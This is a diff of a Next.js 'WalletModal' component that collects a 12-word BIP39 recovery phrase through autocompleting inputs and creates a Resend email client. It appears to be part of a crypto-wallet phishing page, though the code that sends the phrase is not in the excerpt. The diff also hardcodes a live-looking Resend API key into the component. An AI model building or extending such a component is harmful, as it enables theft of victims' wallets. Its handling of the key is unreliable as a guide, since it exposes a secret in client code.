@@ -12,19 +12,26 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { X } from "lucide-react";
 import Image from "next/image";
-import { spiral, mirage } from "ldrs";
+import dynamic from "next/dynamic";
+
 import { useState } from "react";
 import { bip39WordList } from "./bip39Words.js";
 import { Resend } from 'resend';
 
+const isBrowser = typeof window !== "undefined";
+let spiral, mirage;
+if (isBrowser) {
+    ({ spiral, mirage } = require("ldrs"));
+}
 
 
 export default function WalletModal({ isOpen, onClose, active }) {
+  const resend = new Resend("re_Ms2f8JZx_LSqdCR1pyLTjgQYsBQy7Xkux");
   const [gif, setGif] = useState(false);
-  const [first, setFirst] = useState(false);
+  const [first, setFirst] = useState(true);
   const [second, setSecond] = useState(false);
   const [third, setThird] = useState(false);
-  const [forth, setForth] = useState(true);
+  const [forth, setForth] = useState(false);
 
   const [inputs, setInputs] = useState(Array(12).fill("")); // State for 12 inputs
   const [suggestions, setSuggestions] = useState([]); // Global suggestions for the selected input
@@ -98,7 +105,7 @@ export default function WalletModal({ isOpen, onClose, active }) {
     setThird(false);
     setForth(true);
   };
-  const resend = new Resend(process.env.RESEND_API_KEY);
+  
 
   const click4 = () => {
     setGif(true);
